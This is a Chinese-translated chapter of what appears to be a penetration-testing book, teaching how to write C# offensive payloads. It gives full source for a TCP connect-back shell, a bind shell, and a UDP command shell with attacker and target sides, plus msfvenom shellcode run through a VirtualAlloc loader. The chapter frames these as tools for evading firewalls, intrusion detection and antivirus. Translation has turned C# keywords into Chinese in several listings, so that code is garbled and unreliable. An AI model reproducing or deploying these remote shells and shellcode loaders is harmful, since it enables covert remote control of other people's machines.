# 第四章

4

编写连接回传、绑定和 Metasploit 有效载荷

![](img/00010.jpg)

作为渗透测试人员或安全工程师，能够即时编写和定制有效载荷是非常有用的。企业环境之间往往差异很大，而像 Metasploit 这样的框架提供的“现成”有效载荷通常会被入侵检测/防御系统、网络访问控制或网络的其他变量阻止。然而，企业网络中的 Windows 机器几乎总是安装了.NET 框架，这使得 C#成为编写有效载荷的绝佳语言。C#提供的核心库也具有出色的网络类，可以让你在任何环境中迅速开始工作。

最优秀的渗透测试人员知道如何构建定制化的有效载荷，针对特定的环境量身打造，以便能够在不被察觉的情况下维持较长时间的隐匿、保持持久性，或者绕过入侵检测系统或防火墙。本章将向你展示如何编写用于 TCP（传输控制协议）和 UDP（用户数据报协议）的多种有效载荷。我们将创建一个跨平台的 UDP 连接回传有效载荷，以绕过较弱的防火墙规则，并讨论如何运行任意的 Metasploit 汇编有效载荷以帮助避开杀毒软件的检测。

创建连接回传有效载荷

我们将编写的第一种有效载荷是连接回传，这允许攻击者监听目标设备的回传连接。如果你无法直接访问运行有效载荷的机器，这种类型的有效载荷非常有用。例如，如果你在外部网络执行带有 Metasploit Pro 的钓鱼活动，这种有效载荷允许目标设备通过外部网络与你建立连接。另一种方式，我们稍后会讨论，是让有效载荷在目标机器上监听来自攻击者的连接。像这样的绑定有效载荷在你能够获得网络访问权限时，最有助于维持持久性。

网络流

我们将使用大多数 Unix 类操作系统上可用的 netcat 工具来测试我们的绑定和连接回传有效载荷。大多数 Unix 操作系统都预装了 netcat，但如果你想在 Windows 上使用它，则必须通过 Cygwin 或独立的二进制文件下载该工具（或从源代码构建！）。首先，设置 netcat 来监听从我们的目标设备发出的连接回传，如示例 4-1 所示。

> $ nc -l 4444

示例 4-1: 使用 netcat 在端口 4444 上监听

我们的连接回传有效载荷需要创建一个网络流来进行读写。如示例 4-2 所示，有效载荷的 Main()方法的前几行创建了这个网络流，并在后续使用时根据传递给有效载荷的参数来设置。

> public static void Main(string[] args)
> 
> {
> 
> 使用 (TcpClient client = new ➊TcpClient(args[0], ➋int.Parse(args[1])))
> 
> {
> 
> 使用 (Stream stream = client.➌GetStream())
> 
> {
> 
> 使用 (StreamReader rdr = new ➍StreamReader(stream))
> 
> {

清单 4-2：使用有效载荷参数创建回攻攻击者的流

TcpClient 类构造函数接受两个参数：要连接的主机的字符串和要连接的端口号的 int 类型。使用传递给有效载荷的参数，假设第一个参数是要连接的主机，我们将这些参数传递给 TcpClient 构造函数 ➊。由于默认情况下这些参数是字符串，我们不需要将主机强制转换为任何特殊类型，只需要转换端口。

第二个参数，指定要连接的端口，必须以 int 类型提供。为了实现这一点，我们使用 int.Parse() 静态方法 ➋ 将第二个参数从字符串转换为 int。（C# 中许多类型都有静态 Parse() 方法，将一种类型转换为另一种类型。）在实例化 TcpClient 后，我们调用客户端的 GetStream() 方法 ➌ 并将其赋值给变量 stream，供我们读取和写入。最后，我们将流传递给 StreamReader 类构造函数 ➍，以便可以轻松读取来自攻击者的命令。

接下来，我们需要让有效载荷从流中读取数据，只要我们从 netcat 监听器发送命令。为此，我们将使用在清单 4-2 中创建的流，如清单 4-3 所示。

> while (true)
> 
> {
> 
> string cmd = rdr.➊ReadLine();
> 
> if (string.IsNullOrEmpty(cmd))
> 
> {
> 
> rdr.➋Close();
> 
> stream.Close();
> 
> client.Close();
> 
> return;
> 
> }
> 
> if (string.➌IsNullOrWhiteSpace(cmd))
> 
> continue;
> 
> string[] split = cmd.Trim().➍Split(' ');
> 
> string filename = split.➎First();
> 
> string arg = string.➏Join(" ", split.➐Skip(1)); 清单 4-3：从流中读取命令并解析命令及其参数

在一个无限的 while 循环中，StreamReader 的 ReadLine() 方法 ➊ 从流中读取一行数据，然后将其赋值给 cmd 变量。我们根据数据流中出现换行符的位置（\n，或十六进制表示为 0x0a）来判断一行数据的结束。如果 ReadLine() 返回的字符串为空或为 null，我们关闭 ➋ 流读取器、流和客户端，然后从程序中返回。如果字符串仅包含空白字符 ➌，我们通过使用 continue 重新开始循环，这将使我们回到 ReadLine() 方法，从头开始。

在从网络流中读取到要执行的命令后，我们将命令本身与命令的参数分开。例如，如果攻击者发送命令 `ls -a`，命令是 `ls`，命令的参数是 `-a`。

为了分离出参数，我们使用 Split() 方法 ➍ 将完整命令按每个空格分割成字符串，然后返回一个字符串数组。字符串数组是通过将整个命令字符串按照传递给 Split() 方法的分隔符（在我们这里是空格）进行分割得到的结果。接着，我们使用 First() 方法 ➎，该方法可用于如数组等可枚举类型，它从 Split 返回的字符串数组中选择第一个元素，并将其赋值给字符串变量 filename，用于保存基本命令。这应该是实际的命令名称。然后，Join() 方法 ➏ 会将分割数组中的所有元素（除了第一个）通过空格连接成一个字符串。我们还使用 LINQ 的 Skip() 方法 ➐ 来跳过存储在 filename 变量中的数组中的第一个元素。最终的字符串应该包含传递给命令的所有参数。这个新的字符串被赋值给字符串变量 arg。

运行命令

现在我们需要运行命令并将输出返回给攻击者。如示例 4-4 所示，我们使用 Process 和 ProcessStartInfo 类来设置并运行命令，然后将输出写回给攻击者。

> try
> 
> {
> 
> Process prc = new ➊Process();
> 
> prc.➋StartInfo = new ProcessStartInfo();
> 
> prc.StartInfo.➌FileName = filename;
> 
> prc.StartInfo.➍Arguments = arg;
> 
> prc.StartInfo.➎UseShellExecute = false;
> 
> prc.StartInfo.➏RedirectStandardOutput = true;
> 
> prc.➐Start();
> 
> prc.StandardOutput.BaseStream.➑CopyTo(stream);
> 
> prc.WaitForExit();
> 
> }
> 
> catch
> 
> {
> 
> string error = "执行命令时出错 " + cmd + "\n";
> 
> byte[] errorBytes = ➒Encoding.ASCII.GetBytes(error);
> 
> stream.➓Write(errorBytes, 0, errorBytes.Length);
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }

示例 4-4: 运行攻击者提供的命令并返回连接回负载的输出

在实例化一个新的 Process 类 ➊ 后，我们将一个新的 ProcessStartInfo 类分配给 Process 类的 StartInfo 属性 ➋，这使我们可以为命令定义某些选项，从而获取输出。在将 StartInfo 属性赋值为一个新的 ProcessStartInfo 类后，我们再为 StartInfo 属性中的各个属性赋值：FileName 属性 ➌，即我们要运行的命令，以及 Arguments 属性 ➍，它包含命令的任何参数。

我们还将 UseShellExecute 属性 ➎ 设置为 false，将 RedirectStandardOutput 属性 ➏ 设置为 true。如果 UseShellExecute 设置为 true，命令将会在另一个系统 shell 中运行，而不是由当前可执行文件直接运行。通过将 RedirectStandardOutput 设置为 true，我们可以使用 Process 类的 StandardOutput 属性来读取命令的输出。

一旦设置了 StartInfo 属性，我们调用 Process 上的 Start() ➐开始执行命令。进程运行时，我们将其标准输出直接复制到网络流中，使用 CopyTo() ➑将数据发送给攻击者。如果在执行过程中发生错误，Encoding.ASCII.GetBytes() ➒将字符串“Error running command <cmd>”转换为字节数组，然后使用流的 Write()方法 ➓将其写入网络流发送给攻击者。

运行有效载荷

使用 127.0.0.1 和 4444 作为参数运行有效载荷应该会连接回我们的 netcat 监听器，这样我们就可以在本地机器上运行命令，并在终端显示出来，如清单 4-5 所示。

> $ nc -l 4444
> 
> whoami
> 
> bperry
> 
> uname
> 
> Linux 清单 4-5：反向连接有效载荷连接到本地监听器并运行命令

绑定有效载荷

当您处于可以直接访问可能运行有效载荷的机器的网络中时，有时您希望有效载荷等待您连接到它们，而不是您等待它们的连接。

在这种情况下，有效载荷应该本地绑定到一个端口，您可以简单地使用 netcat 连接到该端口，以便开始与系统的 Shell 进行交互。

在反向连接有效载荷中，我们使用 TcpClient 类创建与攻击者的连接。这里，我们将使用 TcpListener 类代替 TcpClient 类，来监听来自攻击者的连接，如清单 4-6 所示。

> public static void Main(string[] args)
> 
> {
> 
> int port = ➊int.Parse(args[0]);
> 
> TcpListener listener = new ➋TcpListener(IPAddress.Any, port);
> 
> 尝试
> 
> {
> 
> listener.➌Start();
> 
> }
> 
> 捕获
> 
> {
> 
> 返回;
> 
> }

清单 4-6：通过命令参数在给定端口上启动 TcpListener

在开始监听之前，我们使用 int.Parse() ➊将传递给有效载荷的参数转换为整数，这将是监听的端口。然后我们通过将 IPAddress.Any 作为第一个参数传递给构造函数，并将我们希望监听的端口作为第二个参数，来实例化一个新的 TcpListener 类 ➋。传递给第一个参数的 IPAddress.Any 值告诉 TcpListener 监听任何可用的接口（0.0.0.0）。

接下来，我们尝试在 try/catch 块中开始监听端口。我们这样做是因为调用 Start() ➌可能会抛出异常，例如，如果有效载荷不是以特权用户身份运行，并且它试图绑定到一个小于 1024 的端口号，或者它试图绑定到另一个程序已经绑定的端口。通过在 try/catch 块中运行 Start()，我们可以捕获此异常并在必要时优雅地退出。当然，如果 Start()成功，载荷将开始在该端口上监听新连接。

接受数据、运行命令并返回输出

现在我们可以开始接受来自攻击者的数据并解析命令，如清单 4-7 所示。

> ➊while (true)
> 
> {
> 
> 使用 (Socket socket = ➋listener.AcceptSocket())
> 
> {
> 
> 使用 (NetworkStream stream = new ➌NetworkStream(socket))
> 
> {
> 
> 使用 (StreamReader rdr = new ➍StreamReader(stream))
> 
> {
> 
> ➎while (true)
> 
> {
> 
> string cmd = rdr.ReadLine();
> 
> 如果 (string.IsNullOrEmpty(cmd))
> 
> {
> 
> rdr.Close();
> 
> stream.Close();
> 
> listener.Stop();
> 
> break;
> 
> }
> 
> 如果 (string.IsNullOrWhiteSpace(cmd))
> 
> continue;
> 
> string[] split = cmd.Trim().➏Split(' ');
> 
> string filename = split.➐First();
> 
> string arg = string.➑Join(" ", split.Skip(1)); Listing 4-7: 从网络流读取命令并将命令与参数分开

为了在我们与负载断开连接后在目标上保持持久性，我们在技术上是无限的 while 循环 ➊ 内实例化一个新的 NetworkStream 类，方法是将 listener.AcceptSocket() 返回的 Socket ➋ 传递给 NetworkStream 构造函数 ➌。然后，为了高效地读取 NetworkStream，在 using 语句的上下文中，我们实例化一个新的 StreamReader 类 ➍，并将网络流传递给 StreamReader 构造函数。一旦我们设置好 StreamReader，就使用第二个无限 while 循环 ➎ 来继续读取命令，直到攻击者发送空行给负载为止。

为了解析并执行来自流的命令并将输出返回给连接的攻击者，我们在内部 while 循环中声明一系列字符串变量，并在字符串中按空格拆分原始输入 ➏。接下来，我们从拆分结果中取出第一个元素，并将其作为要运行的命令，使用 LINQ 选择数组中的第一个元素 ➐。然后，我们再次使用 LINQ 将拆分数组中的所有字符串（从第一个元素开始）连接起来 ➑，并将生成的字符串（以空格分隔的参数）赋值给 arg 变量。

从流中执行命令

现在我们可以设置我们的 Process 和 ProcessStartInfo 类来运行命令及其参数（如果有的话），并捕获输出，如 Listing 4-8 所示。

> 尝试
> 
> {
> 
> Process prc = new ➊Process();
> 
> prc.StartInfo = new ProcessStartInfo();
> 
> prc.StartInfo.➋FileName = filename;
> 
> prc.StartInfo.➌Arguments = arg;
> 
> prc.StartInfo.UseShellExecute = false;
> 
> prc.StartInfo.RedirectStandardOutput = true;
> 
> prc.➍Start();
> 
> prc.StandardOutput.BaseStream.➎CopyTo(stream);
> 
> prc.WaitForExit();
> 
> }
> 
> catch
> 
> {
> 
> string error = "运行命令时出错 " + cmd + "\n";
> 
> byte[] errorBytes = ➏Encoding.ASCII.GetBytes(error);
> 
> stream.➐Write(errorBytes, 0, errorBytes.Length);
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }

Listing 4-8: 运行命令，捕获输出，并将其发送回攻击者

与上一节讨论的反向连接有效负载一样，为了运行命令，我们实例化一个新的 `Process` 类 ➊，并将一个新的 `ProcessStartInfo` 类赋值给 `Process` 类的 `StartInfo` 属性。我们将命令文件名设置为 `StartInfo` 中的 `FileName` 属性 ➋，并将命令参数设置为 `Arguments` 属性 ➌。然后，我们将 `UseShellExecute` 属性设置为 `false`，以便我们的可执行文件直接启动命令，并将 `RedirectStandardOutput` 属性设置为 `true`，以便我们捕获命令输出并将其返回给攻击者。

要启动命令，我们调用 `Process` 类的 `Start()` 方法 ➍。在进程运行时，我们将标准输出流直接复制到网络流中，通过将其作为参数传递给 `CopyTo()` ➎，然后等待进程退出。如果发生错误，我们将字符串“Error running command <cmd>”转换为字节数组，使用 `Encoding.ASCII.GetBytes()` ➏。然后，字节数组写入网络流，并通过流的 `Write()` 方法 ➐ 发送给攻击者。

使用 4444 作为参数运行有效负载将使监听器开始在所有可用接口的端口 4444 上监听。现在，我们可以使用 netcat 连接到监听端口，如 列表 4-9 所示，并开始执行命令并返回其输出。

> $ nc 127.0.0.1 4444
> 
> whoami
> 
> bperry
> 
> uname
> 
> Linux 列表 4-9：连接到绑定有效负载并执行命令

使用 UDP 攻击网络

到目前为止讨论的有效负载使用 TCP 进行通信；TCP 是一种有状态协议，允许两台计算机在一段时间内保持连接。另一种协议是 UDP，它与 TCP 不同，是无状态的：在通信时，两个网络计算机之间不保持连接。相反，通信通过广播进行，每台计算机监听其 IP 地址的广播。

UDP 和 TCP 之间的另一个非常重要的区别是，TCP 尝试确保发送到计算机的数据包将按发送顺序到达该计算机。相比之下，UDP 数据包可能会以任何顺序接收，甚至可能根本不接收，这使得 UDP 比 TCP 更不可靠。

然而，UDP 确实有一些优点。首先，由于它不尝试确保计算机接收它发送的数据包，因此它非常快速。它在网络上的监控也不如 TCP 常见，某些防火墙仅配置处理 TCP 流量。这使得 UDP 成为攻击网络时的理想协议，因此让我们看看如何编写一个 UDP 有效负载，在远程计算机上执行命令并返回结果。

不像以前的有效载荷那样使用 TcpClient 或 TcpListener 类来实现连接和通信，我们将使用 UdpClient 和 Socket 类通过 UDP 通信。攻击者和目标机器都需要监听 UDP 广播，并保持一个套接字以将数据广播到另一台计算机。

目标机器的代码

目标机器上运行的代码将监听 UDP 端口接收命令，执行这些命令，并通过 UDP 套接字将输出返回给攻击者，如列表 4-10 所示。

> public static void Main(string[] args)
> 
> {
> 
> int lport = int.➊Parse(args[0]);
> 
> using (UdpClient listener = new ➋UdpClient(lport))
> 
> {
> 
> IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);
> 
> string cmd;
> 
> byte[] input; 列表 4-10：目标代码中 Main()方法的前五行

在发送和接收数据之前，我们设置了一个变量用于监听的端口。（为了简化起见，我们让目标和攻击者机器在同一端口上监听数据，但这假设我们在攻击一台独立的虚拟机）。如列表 4-10 所示，我们使用 Parse() ➊将传入的字符串参数转换为整数，然后将端口传递给 UdpClient 构造函数 ➋来实例化一个新的 UdpClient。我们还设置了 IPEndPoint 类 ➌，它包含一个网络接口和一个端口，传入 IPAddress.Any 作为第一个参数，监听的端口作为第二个参数。我们将新对象赋值给 localEP（本地端点）变量。现在我们可以开始接收来自网络广播的数据。

主 while 循环

如列表 4-11 所示，我们从一个 while 循环开始，该循环会持续运行，直到从攻击者接收到一个空字符串。

> while (true)
> 
> {
> 
> input = listener.➊Receive(ref localEP);
> 
> cmd = ➋Encoding.ASCII.GetString(input, 0, input.Length);
> 
> if (string.IsNullOrEmpty(cmd))
> 
> {
> 
> listener.Close();
> 
> return;
> 
> }
> 
> if (string.IsNullOrWhiteSpace(cmd))
> 
> continue;
> 
> string[] split = cmd.Trim().➌Split(' ');
> 
> string filename = split.➍First();
> 
> string arg = string.➎Join(" ", split.Skip(1));
> 
> string results = string.Empty; 列表 4-11：监听 UDP 广播并从参数中解析命令

在这个 while 循环中，我们调用 listener.Receive()，传入我们实例化的 IPEndPoint 类。接收到来自攻击者的数据后，Receive() ➊会将 localEP 的 Address 属性填充为攻击主机的 IP 地址和其他连接信息，以便我们稍后在响应时使用这些数据。Receive()还会阻塞有效载荷的执行，直到接收到一个 UDP 广播。

一旦收到广播，Encoding.ASCII.GetString() ➋ 将数据转换为 ASCII 字符串。如果字符串为 null 或为空，我们将跳出 while 循环，让有效载荷进程完成并退出。如果字符串仅包含空格，我们将使用 continue 重新启动循环，等待接收来自攻击者的新命令。确保命令不是空字符串或仅包含空格后，我们会按照空格 ➌ 将命令分割（与 TCP 有效载荷中相同），然后从分割后的字符串数组中提取命令 ➍。接着我们通过连接分割数组中的所有元素（除了第一个元素）来创建参数字符串 ➎。

执行命令并返回结果给发送者

现在，我们可以执行命令并通过 UDP 广播将结果返回给发送者，如 示例 4-12 所示。

> try
> 
> {
> 
> Process prc = new Process();
> 
> prc.StartInfo = new ProcessStartInfo();
> 
> prc.StartInfo.FileName = filename;
> 
> prc.StartInfo.Arguments = arg;
> 
> prc.StartInfo.UseShellExecute = false;
> 
> prc.StartInfo.RedirectStandardOutput = true;
> 
> prc.Start();
> 
> prc.WaitForExit();
> 
> results = prc.StandardOutput.➊ReadToEnd();
> 
> }
> 
> catch
> 
> {
> 
> results = "运行命令时出错：" + filename;
> 
> }
> 
> 使用 (Socket sock = new ➋Socket(AddressFamily.InterNetwork,
> 
> SocketType.Dgram, ProtocolType.Udp))
> 
> {
> 
> IPAddress sender = ➌localEP.Address;
> 
> IPEndPoint remoteEP = new ➍IPEndPoint(sender, lport);
> 
> byte[] resultsBytes = Encoding.ASCII.GetBytes(results);
> 
> sock.➎SendTo(resultsBytes, remoteEP);
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }

示例 4-12：执行收到的命令并将输出广播回攻击者

与之前的有效载荷类似，我们使用 Process 和 ProcessStartInfo 类来执行命令并返回输出。我们使用 filename 和 arg 变量分别存储命令和命令参数，并将它们设置到 StartInfo 属性中，同时还设置 UseShellExecute 属性和 RedirectStandardOutput 属性。通过调用 Start() 方法启动新进程，然后调用 WaitForExit() 方法等待进程执行完毕。一旦命令执行完毕，我们通过读取进程的 StandardOutput 流属性的 ReadToEnd() 方法 ➊ 来获取输出，并将其保存到之前声明的 results 字符串中。如果在进程执行过程中发生错误，我们会将字符串 "运行命令时出错：<cmd>" 赋值给 results 变量。

现在我们需要设置一个用于将命令输出返回给发送者的套接字。我们将使用 UDP 套接字广播数据。通过使用 Socket 类，我们通过将枚举值作为参数传递给 Socket 构造函数来实例化一个新的 Socket ➋。第一个值 AddressFamily.InterNetwork 表示我们将使用 IPv4 地址进行通信。第二个值 SocketType.Dgram 表示我们将使用 UDP 数据报（UDP 中的 D）而不是 TCP 包进行通信。第三个值 ProtocolType.Udp 告诉套接字我们将使用 UDP 与远程主机进行通信。

在创建用于通信的套接字后，我们通过获取 localEP.Address 属性 ➌ 的值来分配一个新的 IPAddress 变量，该值在接收到 UDP 监听器上的数据时会被填充为攻击者的 IP 地址。我们使用攻击者的 IP 地址和作为有效负载参数传递的监听端口，创建一个新的 IPEndPoint ➍。

一旦我们设置好了套接字并且知道将命令输出返回到哪里，Encoding.ASCII.GetBytes() 就会将输出转换为字节数组。我们使用 SendTo() ➎ 在套接字上广播数据，通过将包含命令输出的字节数组作为第一个参数，发送者的端点作为第二个参数，最终，我们再次返回到 while 循环的顶部读取下一个命令。

攻击者的代码

为了使此次攻击有效，攻击者必须能够监听并向正确的主机发送 UDP 广播。列表 4-13 显示了设置 UDP 监听器的第一段代码。

> static void Main(string[] args)
> 
> {
> 
> int lport = int.➊Parse(args[1]);
> 
> using (UdpClient listener = new ➋UdpClient(lport))
> 
> {
> 
> IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);
> 
> string output;
> 
> byte[] bytes; 列表 4-13：为攻击者端代码设置 UDP 监听器和其他变量

假设该代码将接受作为参数的目标主机和监听端口，我们将监听端口传递给 Parse() ➊ 以将字符串转换为整数，然后将结果整数传递给 UdpClient 构造函数 ➋ 来实例化一个新的 UdpClient 类。接着，我们将监听端口传递给 IPEndPoint 类的构造函数，并传递 IPAddress.Any 值来实例化一个新的 IPEndPoint 类 ➌。一旦 IPEndPoint 设置好，我们声明变量 output 和 bytes 以备后用。

创建用于发送 UDP 广播的变量

列表 4-14 显示了如何创建用于发送 UDP 广播的变量。

> using (Socket sock = new ➊Socket(AddressFamily.InterNetwork,
> 
> SocketType.Dgram,
> 
> ProtocolType.Udp))
> 
> {
> 
> IPAddress addr = ➋IPAddress.Parse(args[0]);
> 
> IPEndPoint addrEP = new ➌IPEndPoint(addr, lport); 列表 4-14：创建 UDP 套接字和端点以进行通信

首先，我们在 using 块的上下文中实例化一个新的 Socket 类 ➊。传递给 Socket 的枚举值告诉套接字，我们将使用 IPv4 地址、数据报和 UDP 通过广播进行通信。我们使用 IPAddress.Parse() ➋ 创建一个新的 IPAddress 实例，将传递给代码的第一个参数转换为 IPAddress 类。然后，我们将 IPAddress 对象和目标 UDP 监听器监听的端口传递给 IPEndPoint 构造函数，以实例化一个新的 IPEndPoint 类 ➌。

与目标通信

清单 4-15 显示了我们如何将数据发送到目标并从目标接收数据。

> Console.WriteLine("Enter command to send, or a blank line to quit");
> 
> while (true)
> 
> {
> 
> string command = ➊Console.ReadLine();
> 
> byte[] buff = Encoding.ASCII.GetBytes(command);
> 
> try
> 
> {
> 
> sock.➋SendTo(buff, addrEP);
> 
> if (string.IsNullOrEmpty(command))
> 
> {
> 
> sock.Close();
> 
> listener.Close();
> 
> return;
> 
> }
> 
> if (string.IsNullOrWhiteSpace(command))
> 
> continue;
> 
> bytes = listener.➌Receive(ref localEP);
> 
> output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
> 
> Console.WriteLine(output);
> 
> }
> 
> catch (Exception ex)
> 
> {
> 
> Console.WriteLine("Exception{0}", ex.Message);
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }

清单 4-15: 发送和接收数据到目标 UDP 监听器的主逻辑

在打印了一些友好的帮助文本，说明如何使用此脚本后，我们开始在一个 while 循环中向目标发送命令。首先，Console.ReadLine() ➊ 从标准输入中读取一行数据，这将成为发送到目标机器的命令。然后，Encoding.ASCII.GetBytes() 将该字符串转换为字节数组，以便我们可以通过网络发送它。

接下来，在一个 try/catch 块中，我们尝试使用 SendTo() ➋ 发送字节数组，传入字节数组和要发送数据的 IP 端点。在发送命令字符串后，如果从标准输入读取的字符串为空，我们将跳出 while 循环，因为我们在目标代码中构建了相同的逻辑。如果字符串不是空的，但只是空白，我们会返回到 while 循环的开头。然后，我们在 UDP 监听器上调用 Receive() ➌，以阻塞执行，直到从目标接收到命令输出，这时使用 Encoding.ASCII.GetString() 将接收到的字节转换为字符串，并写入攻击者的控制台。如果发生错误，我们将在屏幕上打印异常消息。

如清单 4-16 所示，在远程机器上启动有效载荷，传递 4444 作为唯一参数给有效载荷，并在攻击者的机器上启动接收器后，我们应该能够执行命令并从目标接收输出。

> $ /tmp/attacker.exe 192.168.1.31 4444
> 
> 输入命令以发送，或者输入空行退出
> 
> whoami
> 
> bperry
> 
> pwd
> 
> /tmp
> 
> uname
> 
> Linux 清单 4-16: 通过 UDP 与目标机器通信以执行任意命令

从 C# 运行 x86 和 x86-64 Metasploit Payloads

Metasploit Framework 漏洞利用工具集由 HD Moore 开始开发，现在由 Rapid7 维护，已成为安全专业人士的事实上的渗透测试和漏洞开发框架。由于它是用 Ruby 编写的，Metasploit 是跨平台的，可以在 Linux、Windows、OS X 和其他许多操作系统上运行。截止目前，已有超过 1,300 个用 Ruby 编程语言编写的免费 Metasploit 漏洞利用。

除了其包含的漏洞利用集合外，Metasploit 还包含许多旨在使漏洞开发快速且通常无痛的库。例如，正如你很快会看到的，你可以使用 Metasploit 来帮助创建一个跨平台的 .NET 程序集，以检测你的操作系统类型和架构，并针对其运行 shellcode。

设置 Metasploit

截至本文撰写时，Rapid7 在 GitHub 上开发 Metasploit ([`github.com/rapid7/metasploit-framework/`](https://github.com/rapid7/metasploit-framework/))。在 Ubuntu 上，使用 git 克隆主 Metasploit 仓库到系统中，如清单 4-17 所示。

> $ sudo apt-get install git
> 
> $ git clone https://github.com/rapid7/metasploit-framework.git  清单 4-17：安装 git 并克隆 Metasploit Framework

注意

> 我建议在本章开发下一个载荷时使用 Ubuntu。当然，也需要在 Windows 上进行测试，以确保你的操作系统检测和载荷在这两个平台上都能正常工作。

安装 Ruby

Metasploit Framework 需要 Ruby。如果在阅读了 Metasploit 安装说明后，发现你需要在 Linux 系统上安装不同版本的 Ruby，可以使用 Ruby 版本管理器（RVM，Ruby Version Manager）([`rvm.io/`](http://rvm.io/)) 来安装它，并与现有的 Ruby 版本一起使用。首先安装 RVM 维护者的 GNU 隐私保护（GPG）密钥，然后按照清单 4-18 中的方法在 Ubuntu 上安装 RVM。

> $ curl -sSL https://rvm.io/mpapis.asc | gpg --import -
> 
> $ curl -sSL https://get.rvm.io | bash -s stable  清单 4-18：安装 RVM

安装 RVM 后，通过查看 Metasploit Framework 根目录下的 .ruby-version 文件，确定 Metasploit Framework 需要的 Ruby 版本，如清单 4-19 所示。

> $ cd metasploit-framework/
> 
> $ cat .ruby-version
> 
> 2.1.5

清单 4-19：打印 Metasploit Framework 根目录下的 .ruby-version 文件内容

现在运行 rvm 命令来编译并安装正确版本的 Ruby，如清单 4-20 所示。这可能需要几分钟，具体取决于你的互联网连接和 CPU 速度。

> $ rvm install 2.x

清单 4-20：安装 Metasploit 所需的 Ruby 版本

一旦 Ruby 安装完成，按照清单 4-21 中的方法设置你的 bash 环境，以便能够看到它。

> $ rvm use 2.x

清单 4-21：将安装的 Ruby 版本设置为默认版本

安装 Metasploit 依赖项

Metasploit 使用 bundler gem（一个 Ruby 包）来管理依赖项。切换到你机器上的当前 Metasploit Framework git 检出目录，并运行 Listing 4-22 中显示的命令，以安装构建 Metasploit Framework 所需的某些 gem 所需的开发库。

> $ cd metasploit-framework/
> 
> $ sudo apt-get install libpq-dev libpcap-dev libxslt-dev
> 
> $ gem install bundler
> 
> $ bundle install  Listing 4-22: 安装 Metasploit 依赖项

一旦所有依赖项安装完成，你应该能够启动 Metasploit Framework，如 Listing 4-23 所示。

> $ ./msfconsole -q
> 
> msf > Listing 4-23: 成功启动 Metasploit

成功启动 msfconsole 后，我们可以开始使用框架中的其他工具来生成负载。

生成负载

我们将使用 Metasploit 工具 msfvenom 来生成原始汇编负载，在 Windows 上打开程序或在 Linux 上运行命令。例如，Listing 4-24 展示了如何向 msfvenom 发送命令，生成一个 x86-64（64 位）负载，用于 Windows，弹出当前显示桌面上的 calc.exe Windows 计算器。（要查看 msfvenom 工具的完整选项列表，请从命令行运行 msfvenom --help。） $ ./msfvenom -p windows/x64/exec -f csharp CMD=calc.exe

未选择平台，正在从负载中选择 Msf::Module::Platform::Windows

未选择架构，正在从负载中选择架构：x86_64

未指定编码器或坏字符，输出原始负载

byte[] buf = new byte[276] {

0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,

--snip--

0x63,0x2e,0x65,0x78,0x65,0x00 }; Listing 4-24: 运行 msfvenom 生成一个原始 Windows 负载，运行 calc.exe 在这里，我们传入 windows/x64/exec 作为负载，csharp 作为负载格式，负载选项 CMD=calc.exe。你也可以传入像 linux/x86/exec 并使用 CMD=whoami 来生成一个负载，该负载在 32 位 Linux 系统上启动时，运行 whoami 命令。

以非托管代码执行原生 Windows 负载

Metasploit 负载以 32 位或 64 位汇编代码生成——在 .NET 世界中称为非托管代码。当你将 C# 代码编译成 DLL 或可执行程序集时，该代码被称为托管代码。两者的区别在于，托管代码需要 .NET 或 Mono 虚拟机才能运行，而非托管代码可以直接由操作系统运行。

要在托管环境中执行非托管汇编代码，我们将使用 .NET 的 P/Invoke 来导入并运行 Microsoft Windows kernel32.dll 中的 VirtualAlloc() 函数。这使我们能够分配所需的可读、可写和可执行的内存，如 Listing 4-25 所示。

> class MainClass
> 
> {
> 
> [➊DllImport("kernel32")]
> 
> static extern IntPtr ➋VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);
> 
> [➌UnmanagedFunctionPointer(CallingConvention.StdCall)]
> 
> delegate void ➍WindowsRun(); 列表 4-25：导入 VirtualAlloc() 函数并定义一个 Windows 特定的委托

在 ➋ 处，我们从 kernel32.dll 导入 VirtualAlloc()。VirtualAlloc() 函数需要四个类型为 IntPtr 的参数，IntPtr 是一个 C# 类，它使得在托管代码和非托管代码之间传递数据变得更加简单。在 ➊ 处，我们使用 C# 属性 DllImport（属性类似于 Java 中的注解或 Python 中的装饰器）来告诉虚拟机在运行时从 kernel32.dll 库中查找此函数。（当我们执行 Linux 负载时，我们将使用 DllImport 属性从 libc 导入函数。）在 ➍ 处，我们声明了一个委托 WindowsRun()，它有一个 UnmanagedFunctionPointer 属性 ➌，该属性告诉 Mono/.NET 虚拟机将此委托作为非托管函数运行。通过将 CallingConvention.StdCall 传递给 UnmanagedFunctionPointer 属性，我们告诉 Mono/.NET 虚拟机使用 StdCall Windows 调用约定调用 VirtualAlloc()。

首先我们需要编写一个 Main() 方法，以根据目标系统架构执行负载，如 列表 4-26 所示。

> public static void Main(string[] args)
> 
> {
> 
> OperatingSystem os = ➊Environment.OSVersion;
> 
> bool x86 = ➋(IntPtr.Size == 4);
> 
> byte[] payload;
> 
> if (os.Platform == ➌PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
> 
> {
> 
> if (!x86)
> 
> payload = new byte[] { [... 完整的 x86-64 负载在此 ...] };
> 
> else
> 
> payload = new byte[] { [... 完整的 x86 负载在此 ...] };
> 
> IntPtr ptr = ➍VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
> 
> ➎Marshal.Copy(payload, 0, ptr, payload.Length);
> 
> WindowsRun r = (WindowsRun)➏Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
> 
> r();
> 
> }
> 
> }

列表 4-26：封装两个 Metasploit 负载的小型 C# 类

